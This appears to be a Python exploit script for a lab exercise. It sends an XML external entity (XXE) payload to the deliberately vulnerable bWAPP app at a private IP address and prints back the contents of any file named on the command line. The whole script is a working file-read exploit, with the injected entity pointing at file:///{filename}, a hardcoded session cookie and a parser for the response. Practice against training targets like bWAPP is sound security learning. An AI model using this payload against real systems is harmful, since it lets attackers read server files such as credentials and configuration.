#!/usr/bin/python3

import requests, base64, sys, re

filename = sys.argv[1]

cookies = {
	"PHPSESSID":"ec4de8edce82534683cde5f8bf564db4",
	"security_level":"0"
}

data = f"""<?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///{filename}">
    ]>
    <reset><login>
            &xxe;
        </login>
        <secret>
            Any bus?
        </secret>
    </reset>
"""

burp = {"http":"http://127.0.0.1:8080"}
headers = {
	"Referer":"http://192.168.100.32/bWAPP/xxe-1.php",
	"Content-type":"text/xml; charset=UTF-8"
}
res = requests.post("http://192.168.100.32/bWAPP/xxe-2.php", cookies=cookies, headers=headers, data=data)

r = re.sub(" ","",res.text)
output = r.split("'")[0]

print(output)
